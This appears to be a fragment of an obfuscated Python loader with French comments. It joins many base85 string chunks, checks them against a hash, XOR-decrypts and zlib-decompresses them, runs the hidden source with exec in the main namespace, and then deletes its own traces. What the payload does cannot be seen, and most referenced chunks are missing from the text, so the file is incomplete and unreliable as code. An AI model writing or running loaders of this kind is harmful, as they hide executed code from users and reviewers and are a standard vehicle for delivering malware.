_cmAS42gj4XLkbq = '(T(H6T`PGon@F`__XrWZ-h0BEJmZ%weR@QpD$N$v'
_ctxU6ZxuHro4h6 = 'DB{#;Y6?zsd172{9ZFswR?g*-dQ$sh=F#%R+bb8x'
_caFPY_wMeQ3LiR = ';%f|GOSLzh%rAU8g%j_s56bI<D^IEO{t)FcQykEC'
_clHLIoVvREAVO2 = 'g7@OxLh-znf54kPiTSlFBuP@_?$l}X7ByW&(yovt'
_cpSODdJAQdlE5V = 'u02Qk>I`=MIBA?Y%aGTa*y+OJF+cx3*SQ;_?hgF#'
_cqAhRPx9dqth0C = 'i3E?Crxj?m%1jexd=%+li_5-&9oU<gU^>xnLzJMq'
_crPBIsHi__VHH0 = 'aZvOgS2hHm!WE)aSLU9b4C_$BKqf~A$`FZX8wqxm'
_cmt7CpUFE81J2_ = '<=~26*i%r-fs2d-tkKRuovs+p!x1(7t@J*Fq1EZp'
_cpxZ4IMPOqifUR = 'Li(>++tCaq+1kQB%a(WpH<ds^gPx=c9Jptgae9qc'
_cdmy5xYk0ddjKY = 'K>4<IqI-Ak<*DF)36~v~Uo3@$S_)l@1?(GDX0+Jf'
_cvOHKPx9sct7AI = 'esj6kJzqyGq9gKvVuukG!^6mVa_sG6YY5yQN|vQV'
_cdHHb08gEy6RJ5 = '=^s80myT8MqmXpWk!Z)B9Vl8lcr9pl^e%=1gi$1Q'
_cirZ2aORYgMCFx = 'd1rUrbT`|)PnAzgY;Z4p3(81D&+amh_fiM(!jz_N'
_cy7XflKckHFuRq = '6tC&I%FT>bikoNo5&sCTa>#~kZl@@v-%!q+Y7c1?'
_cz7AjGCjHwi179 = 'i?w{~P<2Np_|nKq-3<^Sy4c)ncAVH$jvo!FA}0uY'
_cmxG1u465grXkF = 'V?|t8U9piA#R!eGwQClMtLJ!Lke^&uF(@_Rck66Y'
_cwKjLLReSUg42t = 'T*+YCeWc(eG`c#%ehat90#|s?0txl|LRWRCs2na^'
_cqvo2Mt7iFU1O7 = '@x!z'

_phj440HmlPzyUH = __import__('base64').b85decode(_cn9wj8MFdXtrhi + _ciRgoRbTvK4AFg + _cyGTUdqWN8ff8z + _cveREYdchkJIPK + _cjY2dNflOYJIPJ + _cwb3Lj1Tb0FmLH + _chlirRKdne85PE + _cqIZbPHBTUm6QA + _cvbRCMeGcjIE3n + _cuY67niqcbDBUM + _cku6D5lfHOzLik + _ccKE9jwnHQMWOa + _ckogYpS17GV9Ql + _cuctF1Z3QxEFAn + _cnSnFwXYJqhoJU + _cyk_7Fxkfh5y4k + _corM0jGRdWTYXZ + _cqYpXv1KYpZQBX + _cusMvt2INuhM8E + _czMtp0NNSRRr5C + _cvxZki7yEL7nOj + _cxVnwkhmeUnOm1 + _cpWBhpDGpvwvRN + _cuH_U4DrYnx0or + _cs8rk3HhMzND4P + _chE4RLldY3jEaP + _ccBkSRgysohkfi + _ciWuY_JybLcftX + _ckWnrqdG5ZiBF3 + _cwb6mxQUBqq6Du + _cfchkZY05YqhgF + _cv8pNcQVR0Nr2_ + _cz4LBxYpsOpCTq + _cwnmxFSG2XHLT3 + _crXxoZz1SQGk_2 + _cs5pmz18wxSuo2 + _cuJlN3AP5goWV1 + _cqu_agygvncd6P + _cvFiPw0zYM5qTQ + _cvn1V2IBmbkAhD + _cn25zxCE0ks4fN + _cn3OqjijAQQyZM + _cpSoJFNbz1a8RX + _cp7THEYAzb52co + _cg1O54kiF6FHek + _cs1qFmv8pDD_27 + _cgEjzkR6_Xun6b + _cq9vnRYiPyx9m_ + _cneltu0f8eW_cr + _ct0NhPO8I7xEs8 + _cl4XkNU0C4_XQv + _cnjyjayCQV8AMg + _ccpqFm4SsJg9gf + _cwO6l5bsmN9jEk + _cfZY1ubXg95uhD + _ctzteh_BD_T10b + _cgYhX2Fi4zs4de + _coz4QjgK3IjjqO + _cqK0VEvCoyMlNe + _cm9UztNKX_3PCE + _cs0U_zGy_Zie1u + _ccrrg6aG4Djzse + _cuQ7uL9s46X8a_ + _cg2tAtrIksraZU + _ciDb4wsi7TwZUy + _c_U6etBI2dZ8FY + _ctina6OjdyfWSU + _czVHypgygJ5s2Q + _ccMNEPRzc_HvI6 + _cmmQvGHHd_LEM3 + _cpc63wr3QAPf4F + _cb0QLSzogDNYmv + _cgnYOyHKMRuT01 + _cmBWwThADZeQ8E + _cltHkn1i70BEhM + _cbzQqBTw81dnhu + _cgngTxZPH5sCGk + _ceCFparXNUcGYT + _cuHvGzrWAtPu34 + _ck10NlxqMb_Hsy + _cnaXicRxfMZYJ0 + _c_L83xJlH5rQvH + _c_Yzh7mCQLuHgl + _csId1BCKfHunJ4 + _cvtyEvBrNv79U6 + _cpvlZ37BXowCz5 + _cdwxi1HOjvxeZ1 + _ca43vOsyTcNnA5 + _cbvxiFkFWqtyMK + _cyJ_gjB8TVuMID + _cyf0UO6rr0l9XI + _cuEmG1xOLCTRQJ + _ck3lI02mYjTJDh + _csdIz7utmrIVbW + _canTVIy4hM45J7 + _cc9JFB23WIfqWS + _cmfrllt4TIZtUJ + _chEzIa178k8uxD + _cvkopxLMYgEpi_ + _cqpViy5wd3DVfW + _cq9M3xKTkZzatU + _ckvy9uzG02TiDY + _cpAczC3hqvWFA9 + _cyPUQH3WxUex8N + _czoqBKKnQjRECX + _cz8gUqZeyNB0Ff + _coi_rp41P6vF7e + _ccpAtIb40aifGG + _ct8vqs34bIFO7o + _cySftNomxN7nSB + _cjCriW7FSVzW9N + _coX23fW8s8dqZV + _cxm0h_Y6e35WdO + _ct4vmftAQWICm8 + _cqzAOpaGgMRkD1 + _cdBq6GGijELv2x + _cz4j3aL67eAvT_ + _cf1UZU82aCmeWV + _cfzGUpk4lsMuEL + _cfEmAeqFNrTMPv + _cfHSjZEEEB8PPl + _crBuzHvZdONL87 + _cyVKkNl_MJNMMG + _cm8aBJbjxwTtP5 + _cvbpfZpdGYdecc + _cxd6Kg2I9RkdiS + _cl8XnItn88zvk0 + _cr7UTgbFoK0j6A + _cjzrA5tlI3hFuj + _cja2_EqSExhOwQ + _ceJAm9gPY6cPRm + _coCxB9fIgiPvJ7 + _co5qf6IklA0zVO + _c_uIKEb4lbRplN + _cx1JI4drklLsIm + _csyBOwOt2KrFkh + _crQDTCfahVDj9n + _ceKgL_0be_0XN1 + _cnhLQHLTPWVqzD + _c_Nfjsem0GHuue + _cuxn25VsuKI0Hx + _coMw7aQx9PakaO + _cfR2o9zMu9Gc5o + _crR58scJYNdM9x + _coAGY5z4fyEYj1 + _cz49oVIeWSpU_U + _caZSmoE279pxp3 + _cyhI1pgAymilII + _cl8jfrEs5iQxM2 + _cosThX39w9DiNE + _cfJDDnGnvVOuvr + _cf8MEJ43699ogO + _cwQCZTJdVB6kHN + _cb14rIjUJgep4E + _chXBRKDqwS6656 + _cmz9C9IbZGbLwh + _cfa8CgwJydfSmN + _cupXujSkjv3jNP + _cjDdbruyYiRn9k + _cxmvpLCp_CpENL + _cu6_8BYwpSLX8X + _cx00Z4W5bVmnZG + _cvvK7HQYr7QNOf + _cfkjfWw__TGh9O + _cjauJQy9t5TKkf + _coD85XoMp6ir6S + _cmnVygmXjhZ5jO + _cpHdVBjaNtY9z8 + _cd79K9XKO9KTPd + _csRKrugdHTXrAf + _czkO2L61APykpV + _ciBMun_6HLpBeN + _cpJ7dyksa_km3I + _cppoIqglCKoccf + _cxt2wfIBH91ARN + _cah6SFXWwCkq_3 + _ctdIg4G7e8SpPm + _cbYlamLWwCHAZ7 + _cf1Dj9itA_NAnA + _cdBvGPtpzn0rw4 + _cifo8IpNkUwXZV + _ceYBuNdk9bAk8a + _crBo4t6kxqY1yV + _ciJTe9aGSIlPhf + _cvh1GisXAKvOmv + _czMqk75IC_z5vv + _chq3EnAaW0xzLL + _cdHZcE4_Or16tp + _cm4nvGaYzcw4zv + _c__DABGpfGVBzr + _cnKYKKcy4_Ouai + _cu0K4sbnQ4JO1Y + _czAAWWmB_FK_St + _clbnTR_bFN6KMy + _cz3UZu1LeI1jwQ + _cnAlKA8BGja9LX + _cgFBby1eSExQVt + _czqQjBEdSpfSpg + _ceTUEAj2cgeIYy + _ch4bLM0xFXkIYf + _crs_7vMQQk9RFG + _cl_vLwtYBQuwO_ + _cnsKhD3xxKIbdQ + _chD8b5EJG2xFqB + _cnbVN5X496hyUy + _cixTGeG01qaPgx + _cgJWdzPyVnkGAw + _c_TCzVaOMKIfKR + _cbrfEfGxrzN810 + _cuzaeKTaep5l9o + _crVVIC7a48o_iY + _cbkyscTbrHF1LV + _cuPWn1B5fTtKEC + _c_KbFKArAmNjfL + _cnKIedKE19UFAf + _cqJ6BwCv8u0CYg + _cn2gtmrUgTj9lO + _cyjXX3ekzfAtut + _cgTy7FKYzLbKy6 + _cdAXGaBPOTWeNG + _chD5yKQ67po9CK + _crRFDmeVjuSpyc + _ctyo5hge6Oc1SZ + _cm4QSWuR4ZexHj + _ck1GJRN9ya68S0 + _cvr2rR7C3rdorW + _ccAtE4xUEmxZ3t + _cgKTPE8YTXfK8Q + _ccY8ibp_a7q8U8 + _czu34BzLIGZpEB + _cgP3gHqOBnUNVL + _cj9FKmtSs4ACpt + _cjX2P77C3vLFmf + _ceC_g9odCPeTt9 + _crFO0yFfwYS5ee + _ckFJOXIUmkwfJP + _cqvEB9i_nLEIW1 + _ciHJ2DQRkwVsHR + _cq9b14bl8BUA2c + _cgDo85eY4HbZXy + _czv94laApJFfpA + _cxy3aa5ZWym5ce + _crT5V_KCD5WcL5 + _cfEBXl3MgX87qT + _crA5zjSjc_zMZJ + _cmAS42gj4XLkbq + _ctxU6ZxuHro4h6 + _caFPY_wMeQ3LiR + _clHLIoVvREAVO2 + _cpSODdJAQdlE5V + _cqAhRPx9dqth0C + _crPBIsHi__VHH0 + _cmt7CpUFE81J2_ + _cpxZ4IMPOqifUR + _cdmy5xYk0ddjKY + _cvOHKPx9sct7AI + _cdHHb08gEy6RJ5 + _cirZ2aORYgMCFx + _cy7XflKckHFuRq + _cz7AjGCjHwi179 + _cmxG1u465grXkF + _cwKjLLReSUg42t + _cqvo2Mt7iFU1O7)
if __import__('hashlib').sha256(_phj440HmlPzyUH).hexdigest() != '91444d16a6f2313b73e21935eb21a75ad1d078b91dcf39390c69e843a7c0a2b3':
    __import__('sys').exit(1)
_xmC3keSQpIbtZm = bytes([227, 209, 151, 109, 2, 188, 2, 146, 75, 38, 149, 125, 89, 244, 168, 192, 35, 207, 98, 185, 201, 86, 203, 254, 190, 11, 106, 27, 136])
_fkzPByFnLbZ7_Qj = bytes([40, 215, 197, 228, 48, 109, 169, 52, 143, 139, 136, 192, 37, 248, 114, 159, 140, 220, 232, 5, 153, 58, 83, 244, 215, 95, 96, 76, 238])

def _fxjTclRSK90O5T5(_byPZhgrmbf5PR9, _kcShwv2d_6nqGh):
    return bytes(_byPZhgrmbf5PR9[_ikZoxd7FhqqzZG] ^ _kcShwv2d_6nqGh[_ikZoxd7FhqqzZG % len(_kcShwv2d_6nqGh)] for _ikZoxd7FhqqzZG in range(len(_byPZhgrmbf5PR9)))

def _fdz0CnIztgdiJnQ(_twfDK2HGsxnGgl):
    import zlib
    return zlib.decompress(_twfDK2HGsxnGgl) # Un seul niveau de zlib ici pour simplifier

def _feefc0SRXeIhNHU():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xbkCjQcWyTriBU = _fxjTclRSK90O5T5(_phj440HmlPzyUH, _xmC3keSQpIbtZm)
    # 2. Décompression Zlib
    _dmz0C9DxoICQHA = _fdz0CnIztgdiJnQ(_xbkCjQcWyTriBU)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dmz0C9DxoICQHA.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nsSKmcPkkJyEAa = _main.__dict__
    _nsSKmcPkkJyEAa.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nsSKmcPkkJyEAa)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feefc0SRXeIhNHU()
try:
    del _fxjTclRSK90O5T5, _fdz0CnIztgdiJnQ, _feefc0SRXeIhNHU
    del _phj440HmlPzyUH, _xmC3keSQpIbtZm, _fkzPByFnLbZ7_Qj
except:
    pass
